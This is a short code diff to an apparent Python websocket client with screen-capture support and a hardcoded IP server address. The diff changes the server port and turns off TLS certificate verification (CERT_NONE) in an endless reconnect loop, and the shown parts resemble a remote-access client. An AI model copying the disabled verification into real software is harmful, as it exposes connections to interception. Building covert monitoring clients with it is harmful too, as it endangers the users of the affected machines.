@@ -3,6 +3,7 @@ import uuid
 import time
 import base64
 import json
+import ssl
 from pathlib import Path
 import socket
 import websocket
@@ -24,7 +25,7 @@ try:
 except ImportError:
     ImageGrab = None
 
-SERVER_URL = "https://113.45.254.80:8443"
+SERVER_URL = "https://113.45.254.80:8444"
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 8443
 CLIENT_ID = None
@@ -309,7 +310,7 @@ def main():
     while True:
         try:
             print(f"[Client] Connecting to {WS + CID}...")
-            ws.run_forever()
+            ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
         except Exception as e:
             print(f"[Client] Run error: {e}")
         print(f"[Client] Retry in 3 seconds...")
